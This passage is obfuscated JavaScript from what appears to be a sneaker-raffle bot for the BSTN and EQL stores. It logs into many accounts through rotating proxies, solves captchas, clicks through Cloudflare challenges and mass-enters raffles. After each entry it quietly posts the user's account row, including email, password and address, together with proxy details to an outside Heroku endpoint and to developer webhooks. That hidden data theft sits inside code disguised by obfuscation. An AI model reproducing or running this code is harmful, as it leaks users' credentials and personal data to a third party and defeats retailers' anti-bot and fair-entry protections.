                                    await _0x29bde2(_0x1ef650, _0x4236c4['succesDEVMSG']);
                                } catch {
                                    _0x4e0b34 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x5c7b17) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x12d0aa['name'] + ']\x20Task\x20' + (_0x532457 + 0x1) + '\x20:\x20' + _0x5c7b17));
                                var _0x1a8ed1 = _0x5c7b17, _0x31d6fb = await _0x11b6e5(null, _0x12d0aa, 'ver', !![], _0x1a8ed1);
                                const _0x524e32 = { 'errorDEVMSG': { 'embeds': [_0x31d6fb] } };
                                _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x524e32['errorDEVMSG']), await _0x29bde2(_0x2cdbb9, _0x524e32['errorDEVMSG']);
                            } finally {
                                if (_0x4ffb9d)
                                    _0x4ffb9d['close']();
                                if (_0x4e0b34 == 'yes' && _0x25c050 != 0x5)
                                    return console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x12d0aa['name'] + ']\x20Task\x20' + (_0x532457 + 0x1) + '\x20:\x20Retrying\x20(' + _0x25c050 + '\x20/\x205)')), _0xcad4f1--, _0x25c050 = _0x25c050 + 0x1, _0x55af41(_0x12d0aa, _0x43d1dc, _0x468618, _0x532457, _0x25c050);
                                _0x4e0b34 == 'yes' && _0x25c050 >= 0x5 && (_0x4e0b34 = 'no', _0x25c050 = 0x0), _0xcad4f1--, console['log'](_0x597cbe() + '\x20[' + _0x12d0aa['name'] + ']\x20Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']);
                            }
                        }
                        if (_0x5c055d == _0x3c0602['length'] - 0x1) {
                            await _0x55af41(_0x27e58a, _0x3c0602, _0x15b880, _0x5c055d, 0x0);
                            return;
                        }
                        _0x55af41(_0x27e58a, _0x3c0602, _0x15b880, _0x5c055d, 0x0), await _0x140651(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x15fed9, _0x2e819d, _0x1c8ed4) {
                    var _0x52c81c = 0x0, _0x22813c = _0x2e819d;
                    for (var _0x4ebb6b = 0x0; _0x4ebb6b < _0x2e819d['length']; _0x4ebb6b++) {
                        maxTasks = Number(_0x342ed0['threads']);
                        while (_0x52c81c >= maxTasks) {
                            await _0x140651(_0x342ed0['delay']);
                        }
                        let _0x2f58b8 = ![];
                        async function _0x2e6a51(_0x443043, _0x660a17, _0x3b0750, _0x53a9e6, _0x424532) {
                            _0x52c81c++, _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x342ed0['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x5acb5e, _0xc2e1 = _0x660a17[_0x53a9e6];
                            try {
                                await _0x58ea73(_0x660a17, _0x53a9e6);
                            } catch {
                                _0x1dd197 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0x522306(_0x188130) {
                                const _0xfd6c4b = _0x7a56eb['readFileSync']('../successful-tasks.csv', 'utf8'), _0xc00ee5 = _0x25c736['parse'](_0xfd6c4b, { 'header': !![] })['data'];
                                let _0x94ea97 = ![];
                                for (var _0x2b0656 of _0xc00ee5) {
                                    if (_0x2b0656['Url'] == _0x188130['Url'] && _0x2b0656['Email'] == _0x188130['Email']) {
                                        _0x94ea97 = !![];
                                        break;
                                    }
                                }
                                return _0x94ea97;
                            }
                            _0x1b4448(_0x443043['name'] + '\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20/\x20' + _0x660a17['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                            var _0x3b86f5 = Math['round'](Math['random']() * (_0x3b0750['length'] - 0x1)), _0x5e6014 = _0x3b0750[_0x3b86f5]['split'](':'), _0x33b024;
                            let _0x1d0678 = ![], _0x1dd197 = 'no';
                            try {
                                if (await _0x522306(_0x660a17[_0x53a9e6]) == !![]) {
                                    console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x1d0678 = !![], _0x2f58b8 = !![];
                                    return;
                                }
                                try {
                                    _0x33b024 = await _0x51ff47['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5e6014[0x0] + ':' + _0x5e6014[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x33b024 = await _0x51ff47['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x5e6014[0x0] + ':' + _0x5e6014[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x588ce0 = await _0x33b024['newPage'](), _0x5ee522 = await _0x588ce0['target']()['createCDPSession'](), { windowId: _0x5295ae } = await _0x5ee522['send']('Browser.getWindowForTarget');
                                await _0x588ce0['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x49cb95 = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x588ce0['authenticate']({
                                    'username': '' + _0x5e6014[0x2],
                                    'password': '' + _0x5e6014[0x3]
                                }), console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x588ce0['goto']('' + _0x660a17[_0x53a9e6]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x140651(0x1388);
                                var _0x838ac9 = await _0x588ce0['$']('#turnstile-wrapper');
                                if (_0x838ac9) {
                                    console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x140651(0x2710);
                                    const _0x392b39 = await _0x588ce0['$']('#turnstile-wrapper');
                                    if (_0x392b39)
                                        try {
                                            await _0x392b39['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x588ce0['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x32d0da = await _0x588ce0['$']('#turnstile-wrapper');
                                        if (_0x32d0da)
                                            try {
                                                await _0x32d0da['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x588ce0['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x5ee522['send']('Browser.setWindowBounds', {
                                    'windowId': _0x5295ae,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x140651(0x1388), await _0x588ce0['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x588ce0['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x140651(0x1f4), console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Logging\x20in'), await _0x588ce0['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x425c84 => _0x425c84['click']()), await _0x588ce0['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x588ce0['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x140651(0x7d0), await _0x588ce0['waitForSelector']('#email-login'), await _0x588ce0['type']('#email-login', '' + _0x660a17[_0x53a9e6]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x140651(0xdac), await _0x588ce0['waitForSelector']('#password'), await _0x588ce0['type']('#password', '' + _0x660a17[_0x53a9e6]['Password'], { 'delay': 0xe6 }), await _0x140651(0x157c);
                                try {
                                    await _0x588ce0['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x3ee7c0 => _0x3ee7c0['click']());
                                } catch {
                                }
                                try {
                                    await _0x588ce0['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x5a21f5) {
                                }
                                await _0x140651(0x3e8);
                                const _0x2c493b = await _0x588ce0['$']('.enteredDraw_container__2KmQ_');
                                if (_0x2c493b) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x660a17[_0x53a9e6]['Size']);
                                try {
                                    if (_0x660a17[_0x53a9e6]['Size'] != 'RANDOM') {
                                        var _0xb9c591 = _0x660a17[_0x53a9e6]['Size']['replace']('.', ',');
                                        const _0x45720d = await _0x588ce0['$x']('//div[contains(text(),\x20\x27' + _0xb9c591 + '\x27)]');
                                        await _0x45720d[0x0]['click']();
                                    } else {
                                        const _0x524a04 = await _0x588ce0['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x3de741 = Math['round'](Math['random']() * (_0x524a04['length'] - 0x1));
                                        await _0x524a04[_0x3de741]['click']();
                                    }
                                } catch (_0xda26f8) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x140651(0x1f4);
                                const _0x144176 = await _0x588ce0['$']('.addressList_addressItem__LE2PB');
                                if (_0x144176 && _0x660a17[_0x53a9e6]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x588ce0['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x140651(0x5dc), await _0x588ce0['waitForSelector']('#firstname'), await _0x588ce0['type']('#firstname', '' + _0x660a17[_0x53a9e6]['FirstName']), await _0x140651(0x1f4), await _0x588ce0['waitForSelector']('#firstname'), await _0x588ce0['type']('#lastname', '' + _0x660a17[_0x53a9e6]['LastName']), await _0x140651(0x1f4), await _0x588ce0['waitForSelector']('#firstname'), await _0x588ce0['type']('#street', '' + _0x660a17[_0x53a9e6]['Address1']), await _0x140651(0x1f4), await _0x588ce0['waitForSelector']('#firstname'), await _0x588ce0['type']('#houseNumber', _0x660a17[_0x53a9e6]['HouseNumber'] + '\x20' + _0x660a17[_0x53a9e6]['Address2']), await _0x140651(0x1f4), await _0x588ce0['waitForSelector']('#firstname'), await _0x588ce0['select']('#country_code', '' + _0x660a17[_0x53a9e6]['Country']), await _0x140651(0x1f4), await _0x588ce0['type']('#postcode', '' + _0x660a17[_0x53a9e6]['Zip']), await _0x140651(0x1f4), await _0x588ce0['type']('#city', '' + _0x660a17[_0x53a9e6]['City']), await _0x140651(0x1f4), await _0x588ce0['type']('#telephone', '' + _0x660a17[_0x53a9e6]['Phone']), await _0x140651(0x1f4), await _0x588ce0['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x140651(0x9c4);
                                try {
                                    await _0x588ce0['type']('#instagram_name', '' + _0x660a17[_0x53a9e6]['Follower']), await _0x588ce0['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x140651(0x5dc);
                                try {
                                    await _0x588ce0['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x140651(0x5dc), await _0x588ce0['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0xa09ea5 => _0xa09ea5['click']()), await _0x140651(0x1388);
                                try {
                                    await _0x588ce0['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x588ce0['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x660a17[_0x53a9e6]['Size'] != 'RANDOM') {
                                        var _0xb9c591 = _0x660a17[_0x53a9e6]['Size']['replace']('.', ',');
                                        const _0x4475be = await _0x588ce0['$x']('//div[contains(text(),\x20' + _0xb9c591 + ')]');
                                        await _0x4475be[0x0]['click']();
                                    } else {
                                        const _0x53937b = await _0x588ce0['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x3de741 = Math['round'](Math['random']() * (_0x53937b['length'] - 0x1));
                                        await _0x53937b[_0x3de741]['click']();
                                    }
                                    await _0x140651(0x5dc);
                                    try {
                                        await _0x588ce0['hover']('#instagram_name'), await _0x588ce0['type']('#instagram_name', '' + _0x660a17[_0x53a9e6]['Follower']), await _0x588ce0['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x424532 + '\x20/\x205)');
                                    try {
                                        await _0x588ce0['hover']('.checkBox_boxHolder__wLGVe'), await _0x140651(0x5dc), await _0x588ce0['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x140651(0x157c), await _0x588ce0['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x2df97c => _0x2df97c['click']()), await _0x140651(0x1388), await _0x588ce0['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x1dd197 = 'no', _0x1ce4fb(_0x660a17[_0x53a9e6], _0x443043);
                                try {
                                    prxdata = {
                                        'username': _0x34b198['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x39456b),
                                        'proxy': '' + _0x3b0750[_0x53a9e6]
                                    };
                                    var _0x182b9a = JSON['stringify'](prxdata);
                                    let _0x5a90a9 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x182b9a, _0x5a90a9);
                                } catch (_0x40fee2) {
                                }
                                console['log'](_0x16a3a0['green'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x338734 = await _0x11b6e5(_0x660a17[_0x53a9e6], _0x443043, 'dev', ![]), _0x51a0a4 = await _0x11b6e5(_0x660a17[_0x53a9e6], _0x443043, 'pub', ![]);
                                const _0x1efae6 = {
                                    'succesDEVMSG': { 'embeds': [_0x338734] },
                                    'succesPUBMSG': { 'embeds': [_0x51a0a4] }
                                };
                                let _0x39456b = _0x660a17[_0x53a9e6];
                                try {
                                    prxdata = {
                                        'username': _0x34b198['replace']('#', ''),
                                        'module': _0x443043['name'],
                                        'entrydata': JSON['stringify'](_0x39456b),
                                        'proxy': '' + _0x3b0750[_0x53a9e6]
                                    };
                                    var _0x182b9a = JSON['stringify'](prxdata);
                                    let _0xd8b89 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3da5aa['post']('https://jraffles.herokuapp.com/success', _0x182b9a, _0xd8b89);
                                } catch (_0x74ecb0) {
                                }
                                try {
                                    _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x1efae6['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x5ddcdd, _0x1efae6['succesDEVMSG']), await _0x140651(0xc8), await _0x29bde2(_0x259650, _0x1efae6['succesPUBMSG']);
                                } catch (_0x372e28) {
                                    console['log'](_0x16a3a0['yellow'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x372e28));
                                }
                            } catch (_0x24abd7) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20' + _0x24abd7)), _0x1dd197 = 'yes', _0x5acb5e = '' + _0x24abd7;
                                var _0x425000 = await _0x11b6e5(_0x660a17[_0x53a9e6], _0x443043, 'dev', !![], _0x5acb5e), _0x338734 = await _0x11b6e5(_0x660a17[_0x53a9e6], _0x443043, 'dev', ![]), _0x51a0a4 = await _0x11b6e5(_0x660a17[_0x53a9e6], _0x443043, 'pub', ![]);
                                const _0x8f53d8 = {
                                    'succesDEVMSG': { 'embeds': [_0x338734] },
                                    'succesPUBMSG': { 'embeds': [_0x51a0a4] }
                                };
                                _0x8f53d8['errorDEV'] = { 'embeds': [_0x425000] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0x8f53d8['errorDEV']), await _0x29bde2(_0x2cdbb9, _0x8f53d8['errorDEV']);
                            } finally {
                                _0x33b024 && _0x33b024['close']();
                                if (_0x1dd197 == 'yes' && _0x424532 != 0x5)
                                    return console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Task\x20' + (_0x53a9e6 + 0x1) + '\x20:\x20Retrying\x20(' + _0x424532 + '\x20/\x205)')), _0x424532 = _0x424532 + 0x1, _0x52c81c--, _0x2e6a51(_0x443043, _0x660a17, _0x3b0750, _0x53a9e6, _0x424532);
                                _0x1dd197 == 'yes' && _0x424532 >= 0x5 && _0x13d7e5(_0x660a17[_0x53a9e6], _0x443043), !_0x1d0678 && (console['log'](_0x597cbe() + '\x20[' + _0x443043['name'] + ']\x20Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay'])), _0x52c81c--;
                            }
                        }
                        _0x2e6a51(_0x15fed9, _0x22813c, _0x1c8ed4, _0x4ebb6b, 0x0), await _0x140651(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x233aa6, _0x1ffac4) {
                    var _0x635cb9 = 0x0, _0x4a7bba;
                    try {
                        const _0x31b21d = _0x7a56eb['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x4a7bba = _0x25c736['parse'](_0x31b21d, { 'header': !![] })['data'];
                    } catch (_0x159073) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x228c65 = 0x0; _0x228c65 < _0x4a7bba['length']; _0x228c65++) {
                        maxTasks = Number(_0x342ed0['threads']);
                        while (_0x635cb9 >= maxTasks) {
                            await _0x140651(_0x342ed0['delay']);
                        }
                        async function _0x3b6d39(_0x23a508, _0x3cf218, _0x1c8803, _0x4d8fd3, _0x174461) {
                            _0x635cb9++, _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x342ed0['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x184302 != 'yes')
                                var _0x184302 = '', _0x174461 = 0x0;
                            var _0x40196f;
                            _0x1b4448(_0x23a508['name'] + '\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20/\x20' + _0x1c8803['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                            var _0x585ff7 = await _0x11b6e5(_0x1c8803[_0x4d8fd3], _0x23a508, 'acc', ![]);
                            const _0xc84687 = { 'succesDEVMSG': { 'embeds': [_0x585ff7] } }, _0x30045c = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x184356 = Math['round'](Math['random']() * (_0x3cf218['length'] - 0x1)), _0xd7831d = _0x3cf218[_0x184356]['split'](':'), _0x17adcc;
                            try {
                                _0x17adcc = await _0x51ff47['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xd7831d[0x0] + ':' + _0xd7831d[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x17adcc = await _0x51ff47['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0xd7831d[0x0] + ':' + _0xd7831d[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20:\x20Checking\x20' + _0x1c8803[_0x4d8fd3]['Email']);
                                const _0x10a000 = await _0x17adcc['newPage']();
                                await _0x10a000['authenticate']({
                                    'username': '' + _0xd7831d[0x2],
                                    'password': '' + _0xd7831d[0x3]
                                }), console['log'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x10a000['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x10a000['setRequestInterception'](!![]), _0x10a000['on']('request', _0x409e2f => {
                                    _0x409e2f['resourceType']() === 'image' ? _0x409e2f['abort']() : _0x409e2f['continue']();
                                });
                                try {
                                    await _0x10a000['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x10a000['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x184302 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x10a000['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x140651(0x3e8), await _0x10a000['type']('#email', _0x1c8803[_0x4d8fd3]['Email']), await _0x140651(0x1f4), await _0x10a000['type']('#pass', _0x1c8803[_0x4d8fd3]['Password']), await _0x140651(0x1f4), await _0x10a000['$eval']('#login-form', _0x6f5900 => _0x6f5900['submit']());
                                try {
                                    await _0x10a000['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x140651(0x190);
                                const _0x2417f5 = await _0x10a000['evaluate'](() => {
                                    const _0x517dfc = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x517dfc['map'](_0x2c18b8 => _0x2c18b8['alt']);
                                }), _0x162e6e = await _0x10a000['evaluate'](() => {
                                    const _0x502696 = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x502696['map'](_0x459af6 => _0x459af6['innerHTML']);
                                }), _0x19c17b = await _0x10a000['$$']('.raffle-winner');
                                if (_0x19c17b['length'] < 0x1) {
                                    console['log'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x184302 = 'no';
                                    return;
                                }
                                console['log'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20:\x20' + _0x19c17b['length'] + '\x20Wins\x20Found!');
                                for (var _0x4d9448 = 0x0; _0x4d9448 < _0x19c17b['length']; _0x4d9448++) {
                                    console['log'](_0x16a3a0['green'](_0x2417f5[_0x4d9448] + _0x162e6e[_0x4d9448]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x13460e) {
                                console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20:\x20' + _0x13460e)), _0x40196f = '' + _0x13460e;
                                var _0x436f89 = await _0x11b6e5(_0x1c8803[_0x4d8fd3], _0x23a508, 'acc', !![], _0x40196f);
                                _0xc84687['errorDEV'] = { 'embeds': [_0x436f89] }, _0x342ed0['webhook'] != undefined && _0x342ed0['webhook'] != '' && await _0x29bde2(_0x342ed0['webhook'], _0xc84687['errorDEV']), await _0x29bde2(_0x2cdbb9, _0xc84687['errorDEV']), _0x184302 = 'yes';
                            } finally {
                                if (_0x17adcc)
                                    _0x17adcc['close']();
                                if (_0x184302 == 'yes' && _0x174461 != 0x5)
                                    return console['log'](_0x16a3a0['red'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Task\x20' + (_0x4d8fd3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x174461 + '\x20/\x205)')), _0x635cb9--, _0x174461 = _0x174461 + 0x1, _0x3b6d39(_0x23a508, _0x3cf218, _0x1c8803, _0x4d8fd3, _0x174461);
                                _0x184302 == 'yes' && _0x174461 >= 0x5 && (_0x13d7e5(_0x1c8803[_0x4d8fd3], _0x23a508), _0x184302 = 'no', _0x174461 = 0x0), console['log'](_0x597cbe() + '\x20[' + _0x23a508['name'] + ']\x20Waiting\x20for\x20' + _0x342ed0['delay'] + '\x20ms'), await _0x140651(_0x342ed0['delay']), _0x635cb9--;
                            }
                        }
                        _0x3b6d39(_0x233aa6, _0x1ffac4, _0x4a7bba, _0x228c65, 0x0), await _0x140651(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x1b4313, _0x22383c, _0x4a8f74) {
                _0x51ff47['use'](_0x30c330()), _0x51ff47['use'](_0x16fe7c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x342ed0['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x5a5769 = 0x0; _0x5a5769 < _0x22383c['length']; _0x5a5769++) {
                    var _0x47d3f8;
                    _0x1b4448(_0x1b4313['name'] + '\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20/\x20' + _0x22383c['length'] + '\x20||\x20File:\x20' + _0x318aef + '\x20Proxies:\x20' + _0x28792f);
                    try {
                        await _0x58ea73(_0x22383c, _0x5a5769);
                    } catch {
                        _0x903d8d = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x2e50c0(_0x3a91c5) {
                        const _0x28071f = _0x7a56eb['readFileSync']('../successful-tasks.csv', 'utf8'), _0x189a3f = _0x25c736['parse'](_0x28071f, { 'header': !![] })['data'];
                        let _0x3d2df2 = ![];
                        for (var _0x2032c4 of _0x189a3f) {
                            if (_0x2032c4['Url'] == _0x3a91c5['Url'] && _0x2032c4['Email'] == _0x3a91c5['Email']) {
                                _0x3d2df2 = !![];
                                break;
                            }
                        }
                        return _0x3d2df2;
                    }
                    if (await _0x2e50c0(_0x22383c[_0x5a5769]) == !![]) {
                        console['log'](_0x597cbe() + '\x20[' + _0x1b4313['name'] + ']\x20Task\x20' + (_0x5a5769 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0xfd9218 = ![];
                    const _0x32ae7d = _0x7a56eb['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x103283 = _0x25c736['parse'](_0x32ae7d, { 'header': !![] })['data'];
                    for (var _0x115f21 of _0x103283) {
                        _0x115f21['Email'] == _0x22383c[_0x5a5769]['Email'] && (_0xfd9218 = !![]);
                    }
                    if (_0xfd9218 == ![]) {
                        var _0x5a40ca;
                        if (_0x22383c[_0x5a5769]['Url']['endsWith']('/')) {
                            _0x5a40ca = _0x22383c[_0x5a5769]['Url'] + 'register';
                            if (_0x903d8d != 'yes')
                                var _0x903d8d = '', _0x2d69f1 = 0x0;
                        } else {
                            _0x5a40ca = _0x22383c[_0x5a5769]['Url'] + '/register';
                            if (_0x903d8d != 'yes')
                                var _0x903d8d = '', _0x2d69f1 = 0x0;
                        }
